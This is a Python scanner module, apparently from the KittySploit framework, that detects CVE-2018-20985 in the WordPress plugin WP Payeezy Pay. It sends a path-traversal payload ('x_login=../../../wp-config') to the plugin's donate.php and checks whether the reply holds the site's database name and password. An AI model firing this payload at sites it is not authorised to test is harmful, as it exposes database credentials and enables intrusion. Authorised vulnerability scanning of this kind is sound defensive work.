#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Plugin WP Payeezy Pay is prone to a local file inclusion vulnerability because it fails to sufficien."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Payeezy Pay <=2.97 - Local File Inclusion Detection',
        'description': 'WordPress Plugin WP Payeezy Pay is prone to a local file inclusion vulnerability because it fails to sufficiently verify user-supplied input. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks. WordPress Plugin WP Payeezy Pay version 2.97 is vulnerable; prior versions are also affected.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'wordpress', 'lfi', 'plugin', 'payeezy', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.pluginvulnerabilities.com/2018/12/06/our-improved-proactive-monitoring-has-now-caught-a-local-file-inclusion-lfi-vulnerability-as-well/',
            'https://wordpress.org/plugins/wp-payeezy-pay/#developers',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-20985',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2018-20985',
    }

    def run(self):
        path = '/wp-content/plugins/wp-payeezy-pay/donate.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='x_login=../../../wp-config')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('The base configuration for WordPress', "define( 'DB_NAME',", "define( 'DB_PASSWORD',",)
        if all(m in body for m in body_all):
            self.set_info(
                severity='critical',
                reason='WordPress Payeezy Pay <=2.97 - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

